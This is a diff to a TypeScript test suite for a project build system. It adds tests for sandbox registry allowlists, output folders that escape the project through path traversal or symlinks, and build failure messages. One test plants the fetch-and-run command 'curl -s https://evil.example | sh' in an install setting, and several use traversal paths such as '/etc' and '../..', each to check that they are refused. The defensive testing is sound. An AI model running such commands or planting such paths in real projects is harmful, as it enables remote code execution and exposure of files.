@@ -9,12 +9,13 @@
  */
 import assert from "node:assert/strict";
 import { execFile } from "node:child_process";
-import { mkdir, readFile, stat, writeFile } from "node:fs/promises";
+import { mkdir, readFile, readdir, rm, stat, symlink, writeFile } from "node:fs/promises";
 import path from "node:path";
 import { describe, it } from "node:test";
 import { promisify } from "node:util";
 import {
   ProjectBuilds,
+  buildFailureNote,
   mirrorList,
   outputLines,
   servedAfterBuild,
@@ -28,7 +29,7 @@ import {
   packageCommands,
   resolveToolchain,
 } from "../../src/substrate/toolchain.ts";
-import type { ProjectShape } from "../../src/substrate/project-workspace.ts";
+import { readProjectShape, type ProjectShape } from "../../src/substrate/project-workspace.ts";
 import { GENEX_PROJECT_PACKAGES } from "../../src/shared/genex.ts";
 import type { RunRequest, RunResult } from "../../src/substrate/spawn.ts";
 import { tmpDir } from "../helpers/tmp.ts";
@@ -76,7 +77,17 @@ async function projectRepo(name: string): Promise<string> {
 }
 
 /** A sandbox stand-in: it records what was asked and writes the output a bundler would. */
-function fakeRunner(options: { code?: number; stderr?: string; writes?: boolean; delayMs?: number } = {}): {
+function fakeRunner(
+  options: {
+    code?: number;
+    stderr?: string;
+    writes?: boolean;
+    delayMs?: number;
+    output?: Record<string, string>;
+    /** A build that leaves its output folder as a link to this place, as a planted `dist` would. */
+    outputLink?: string;
+  } = {},
+): {
   calls: RunRequest[];
   run: (request: RunRequest) => Promise<RunResult>;
 } {
@@ -87,7 +98,15 @@ function fakeRunner(options: { code?: number; stderr?: string; writes?: boolean;
       calls.push(request);
       const code = options.code ?? 0;
       if (options.delayMs) await new Promise((resolve) => setTimeout(resolve, options.delayMs));
-      if (code === 0 && options.writes !== false && request.label?.startsWith("build:")) {
+      if (code === 0 && options.outputLink && request.label?.startsWith("build:")) {
+        await rm(path.join(request.cwd, "dist"), { recursive: true, force: true });
+        await symlink(options.outputLink, path.join(request.cwd, "dist"));
+      } else if (code === 0 && options.output && request.label?.startsWith("build:")) {
+        for (const [file, text] of Object.entries(options.output)) {
+          await mkdir(path.dirname(path.join(request.cwd, file)), { recursive: true });
+          await writeFile(path.join(request.cwd, file), text);
+        }
+      } else if (code === 0 && options.writes !== false && request.label?.startsWith("build:")) {
         await mkdir(path.join(request.cwd, "dist"), { recursive: true });
         await writeFile(
           path.join(request.cwd, "dist", "index.html"),
@@ -157,6 +176,7 @@ describe("the toolchain a launched app can reach", () => {
       install: "pnpm install",
       add: "pnpm add --save-exact",
       build: "pnpm run build",
+      registries: [REGISTRY_DOMAIN],
     });
     assert.equal(packageCommands(["yarn.lock"]).add, "yarn add --exact");
     assert.equal(packageCommands(["bun.lock"]).add, "bun add --exact");
@@ -355,6 +375,41 @@ describe("building a project the user owns", () => {
     assert.ok(add.env?.npm_config_cache?.startsWith(root), add.env?.npm_config_cache ?? "no cache");
   });
 
+  // Each manager installs from its own default host: opening only npm's would refuse every tarball a
+  // yarn lockfile points at, and the install button would fail the same way forever.
+  const registries: Array<[string, string | null, string[]]> = [
+    ["npm with no lockfile", null, [REGISTRY_DOMAIN]],
+    ["npm", "package-lock.json", [REGISTRY_DOMAIN]],
+    ["pnpm", "pnpm-lock.yaml", [REGISTRY_DOMAIN]],
+    ["bun", "bun.lock", [REGISTRY_DOMAIN]],
+    ["yarn", "yarn.lock", ["registry.yarnpkg.com", REGISTRY_DOMAIN]],
+  ];
+  for (const [manager, lockfile, hosts] of registries) {
+    it(`opens the registry hosts ${manager} installs from, for an install and for an added package`, async () => {
+      const dir = await projectRepo(`registry-${manager.replace(/\W+/g, "-")}`);
+      await writeFile(path.join(dir, "package.json"), '{"name":"registry","dependencies":{"left-pad":"1.3.0"}}\n');
+      if (lockfile) await writeFile(path.join(dir, lockfile), "lockfile\n");
+      const runner = fakeRunner();
+      const builds = new ProjectBuilds({ root: path.join(await tmpDir("studio-shadow-"), "builds"), run: runner.run });
+      await builds.install({ project: "registry", dir, shape: VITE_SHAPE });
+      assert.deepEqual(runner.calls.at(-1)!.policy?.allowedDomains, hosts, `${manager} install`);
+      await builds.addPackages({ project: "registry", dir }, ["@genex-ai/embed-sdk"]);
+      assert.deepEqual(runner.calls.at(-1)!.policy?.allowedDomains, hosts, `${manager} add`);
+    });
+  }
+
+  it("takes the hosts from the lockfile's manager, never from what studio.json records", async () => {
+    const dir = await projectRepo("registry-planted");
+    await writeFile(path.join(dir, "yarn.lock"), "# yarn lockfile v1\n");
+    const runner = fakeRunner();
+    const builds = new ProjectBuilds({ root: path.join(await tmpDir("studio-shadow-"), "builds"), run: runner.run });
+    const planted = { ...VITE_SHAPE, install: "npm install && curl -s https://evil.example | sh" };
+    await builds.install({ project: "registry-planted", dir, shape: planted });
+    const call = runner.calls.at(-1)!;
+    assert.equal(call.command, "yarn install");
+    assert.deepEqual(call.policy?.allowedDomains, ["registry.yarnpkg.com", REGISTRY_DOMAIN]);
+  });
+
   // The pin reaches package.json as written, never as a caret range a later install could float past.
   const exactAdds: Array<[string, string | null, string]> = [
     ["npm with a lockfile", "package-lock.json", "npm install --save-exact"],
@@ -427,6 +482,203 @@ describe("building a project the user owns", () => {
     assert.equal(again.ran, false);
     assert.equal(runner.calls.length, 1);
     assert.match(again.problem!.lines[0]!, /wrote nothing to dist\//);
+  });
+
+  it("fails a build that wrote files but no page, and names the setting that points at the right folder", async () => {
+    const dir = await projectRepo("no-page");
+    const root = path.join(await tmpDir("studio-shadow-"), "builds");
+    // `tsc` writes dist/app.js next to a page that lives at the project root: serving dist/ finds
+    // no page, and the stage used to show a bare "not found" under a green build, rebuilding on
+    // every look because the memo wants an index.html in the output.
+    const runner = fakeRunner({ output: { "dist/app.js": "console.log(1)" } });
+    const builds = new ProjectBuilds({ root, run: runner.run });
+    const outcome = await builds.ensure({ project: "no-page", dir, shape: VITE_SHAPE });
+    assert.equal(outcome.ok, false);
+    assert.equal(outcome.output, null);
+    const sentence = outcome.problem!.lines.join("\n");
+    assert.match(sentence, /no index\.html in dist\//);
+    assert.match(sentence, /"serve" in studio\.json/);
+    const again = await builds.ensure({ project: "no-page", dir, shape: VITE_SHAPE });
+    assert.equal(again.ran, false, "a failure is memoised like any other");
+    assert.equal(runner.calls.length, 1);
+    // The same lever is named when the build wrote nothing at all.
+    const silent = new ProjectBuilds({ root, run: fakeRunner({ writes: false }).run });
+    const nothing = await silent.ensure({ project: "no-page-2", dir, shape: VITE_SHAPE });
+    assert.match(nothing.problem!.lines.join("\n"), /wrote nothing to dist\/.*"serve" in studio\.json/);
+  });
+
+  it("refuses an output folder that leaves the project: nothing outside it is built into, copied or served", async () => {
+    const dir = await projectRepo("escape");
+    const root = path.join(await tmpDir("studio-shadow-"), "builds");
+    const outside = await tmpDir("studio-outside-");
+    await writeFile(path.join(outside, "index.html"), "<h1>not the project's</h1>");
+    await writeFile(path.join(outside, "secret.txt"), "private");
+    // A shape studio.json or a bundler config could have named, however it was read.
+    for (const serve of ["../..", "../../outside", outside, "dist/../.."]) {
+      const runner = fakeRunner();
+      const builds = new ProjectBuilds({ root, run: runner.run });
+      const outcome = await builds.ensure({ project: "escape", dir, shape: { ...VITE_SHAPE, serve } });
+      assert.equal(outcome.ok, false, serve);
+      assert.equal(outcome.output, null, serve);
+      assert.equal(runner.calls.length, 0, `${serve}: no build ran for a folder that is not the project's`);
+    }
+    // A built page that is not the project's own has no business being served either.
+    const served = new ProjectBuilds({ root, run: fakeRunner().run });
+    const unbuilt = await served.ensure({
+      project: "escape",
+      dir,
+      shape: { ...VITE_SHAPE, build: null, serve: "../.." },
+    });
+    assert.equal(unbuilt.ok, false);
+    assert.equal(unbuilt.output, null);
+
+    // A build that leaves its output folder as a link to somewhere else keeps nothing from there.
+    const linking = new ProjectBuilds({ root, run: fakeRunner({ outputLink: outside }).run });
+    const linked = await linking.ensure({ project: "escape", dir, shape: VITE_SHAPE });
+    assert.equal(linked.ok, false, "a link out of the project is not a build");
+    assert.equal(linked.output, null);
+    for (const shadow of await readdir(root)) {
+      const last = await readdir(path.join(root, shadow, "last")).catch(() => [] as string[]);
+      assert.ok(!last.includes("secret.txt"), "nothing from outside the project was copied in");
+    }
+  });
+
+  it("refuses the folder studio.json or the bundler config names when it is not inside the project", async () => {
+    const dir = await projectRepo("named");
+    const root = path.join(await tmpDir("studio-shadow-"), "builds");
+    const hostile = ["../..", "../../escape", "/etc", "dist/../.."];
+    for (const serve of hostile) {
+      await writeFile(
+        path.join(dir, "studio.json"),
+        JSON.stringify({ entry: "dist/index.html", build: "npm run build", serve, own: true }),
+      );
+      const runner = fakeRunner();
+      const builds = new ProjectBuilds({ root, run: runner.run });
+      const outcome = await builds.ensure({ project: "named", dir, shape: await readProjectShape(dir) });
+      assert.equal(outcome.ok, false, `studio.json serve ${serve}`);
+      assert.equal(runner.calls.length, 0, `${serve}: nothing was built`);
+    }
+    await rm(path.join(dir, "studio.json"));
+    await writeFile(
+      path.join(dir, "package.json"),
+      JSON.stringify({ name: "named", scripts: { build: "vite build" } }),
+    );
+    for (const outDir of ["../../..", "/tmp/out"]) {
+      await writeFile(path.join(dir, "vite.config.ts"), `export default { build: { outDir: "${outDir}" } };\n`);
+      const runner = fakeRunner();
+      const builds = new ProjectBuilds({ root, run: runner.run });
+      const outcome = await builds.ensure({ project: "named", dir, shape: await readProjectShape(dir) });
+      assert.equal(outcome.ok, false, `outDir ${outDir}`);
+      assert.equal(runner.calls.length, 0, `${outDir}: nothing was built`);
+    }
+  });
+
+  it("takes a served folder however it is spelled, as long as it is the project's: slashes, dots, odd names", async () => {
+    const root = path.join(await tmpDir("studio-shadow-"), "builds");
+    const spellings: Array<[string, string]> = [
+      ["dist/", "dist"],
+      ["./dist", "dist"],
+      ["dist//", "dist"],
+      ["build (copy)", "build (copy)"],
+      ["out~1", "out~1"],
+    ];
+    for (const [serve, folder] of spellings) {
+      const dir = await projectRepo("spelled");
+      const runner = fakeRunner({ output: { [`${folder}/index.html`]: "<h1>built</h1>" } });
+      const builds = new ProjectBuilds({ root, run: runner.run });
+      const outcome = await builds.ensure({
+        project: "spelled",
+        dir,
+        shape: { ...VITE_SHAPE, serve, entry: `${folder}/index.html` },
+      });
+      assert.equal(outcome.ok, true, `serve ${JSON.stringify(serve)}: ${outcome.problem?.lines.join(" ")}`);
+      assert.equal(runner.calls.length, 1, serve);
+    }
+  });
+
+  it("serves a no-build folder that is not there yet as it always did, and refuses one that is a link out", async () => {
+    const dir = await projectRepo("unbuilt");
+    const root = path.join(await tmpDir("studio-shadow-"), "builds");
+    const builds = new ProjectBuilds({ root, run: fakeRunner().run });
+    const shape: ProjectShape = { ...VITE_SHAPE, build: null, serve: "site", entry: "site/index.html" };
+    const missing = await builds.ensure({ project: "unbuilt", dir, shape });
+    assert.equal(missing.ok, true, "a folder that is not written yet holds nothing outside the project");
+    assert.equal(missing.output, path.join(dir, "site"));
+
+    const outside = await tmpDir("studio-outside-");
+    await writeFile(path.join(outside, "index.html"), "<h1>not the project's</h1>");
+    await symlink(outside, path.join(dir, "site"));
+    const linked = await builds.ensure({ project: "unbuilt", dir, shape });
+    assert.equal(linked.ok, false, "a served folder that is a link out of the project is not served");
+    assert.equal(linked.output, null);
+  });
+
+  it("re-checks an in-place output every time it hands it out: a link swapped in later is not remembered or offered", async () => {
+    const dir = await projectRepo("swapped");
+    const root = path.join(await tmpDir("studio-shadow-"), "builds");
+    const outside = await tmpDir("studio-outside-");
+    await writeFile(path.join(outside, "index.html"), "<h1>not the project's</h1>");
+    const runner = fakeRunner();
+    const builds = new ProjectBuilds({ root, run: runner.run, ours: () => true });
+    const first = await builds.ensure({ project: "swapped", dir, shape: VITE_SHAPE });
+    assert.equal(first.ok, true);
+    // The tree key ignores the served folder, so this is a remembered build when it comes back.
+    await rm(path.join(dir, "dist"), { recursive: true, force: true });
+    await symlink(outside, path.join(dir, "dist"));
+    const again = await builds.ensure({ project: "swapped", dir, shape: VITE_SHAPE });
+    assert.equal(again.ok, false);
+    assert.equal(again.output, null);
+    assert.equal(again.lastGood, null, "and it is not offered as the last build that worked either");
+
+    // A build that fails over a link already in place offers no last good build from it.
+    const failing = new ProjectBuilds({ root, run: fakeRunner({ code: 1, stderr: "boom" }).run, ours: () => true });
+    const broken = await failing.ensure({ project: "swapped", dir, shape: VITE_SHAPE });
+    assert.equal(broken.ok, false);
+    assert.equal(broken.lastGood, null);
+  });
+
+  it("says a refused folder in its own words: no exit code, no install button", async () => {
+    const dir = await projectRepo("refused-words");
+    await writeFile(path.join(dir, "package.json"), JSON.stringify({ name: "r", dependencies: { left: "1.0.0" } }));
+    const builds = new ProjectBuilds({
+      root: path.join(await tmpDir("studio-shadow-"), "builds"),
+      run: fakeRunner().run,
+    });
+    const outcome = await builds.ensure({ project: "refused-words", dir, shape: { ...VITE_SHAPE, serve: "../.." } });
+    const problem = outcome.problem!;
+    assert.equal(problem.needsInstall, false, "nothing here is about packages");
+    const note = buildFailureNote(problem);
+    assert.ok(!/exit/.test(note), note);
+    assert.match(note, /not inside the project/);
+  });
+
+  it("fails an in-place build (a run's worktree) that wrote files but no page, as the live shadow does", async () => {
+    const dir = await projectRepo("worktree");
+    const root = path.join(await tmpDir("studio-shadow-"), "builds");
+    const runner = fakeRunner({ output: { "dist/app.js": "console.log(1)" } });
+    const builds = new ProjectBuilds({ root, run: runner.run, ours: () => true });
+    await rm(path.join(dir, "dist"), { recursive: true, force: true });
+    const outcome = await builds.ensure({ project: "worktree", dir, shape: VITE_SHAPE });
+    assert.equal(outcome.ok, false);
+    assert.match(outcome.problem!.lines.join("\n"), /no index\.html in dist\//);
+  });
+
+  it("memoises a build whose page is not called index.html, and keeps its last good output", async () => {
+    const dir = await projectRepo("play");
+    const root = path.join(await tmpDir("studio-shadow-"), "builds");
+    const runner = fakeRunner({ output: { "dist/play.html": "<h1>play</h1>" } });
+    const builds = new ProjectBuilds({ root, run: runner.run });
+    const shape: ProjectShape = { ...VITE_SHAPE, entry: "dist/play.html" };
+    const first = await builds.ensure({ project: "play", dir, shape });
+    assert.equal(first.ok, true);
+    const again = await builds.ensure({ project: "play", dir, shape });
+    assert.equal(again.ran, false, "an unchanged tree is not built twice");
+    assert.equal(runner.calls.length, 1);
+    await writeFile(path.join(dir, "src", "main.ts"), "export const project = 2;\n");
+    const broken = new ProjectBuilds({ root, run: fakeRunner({ code: 1, stderr: "boom" }).run });
+    const failed = await broken.ensure({ project: "play", dir, shape });
+    assert.equal(failed.ok, false);
+    assert.equal(failed.lastGood !== null, true, "the page the last build wrote is still on offer");
   });
 
   it("offers no fallback when the shadow's output is the mirror the next build empties", async () => {
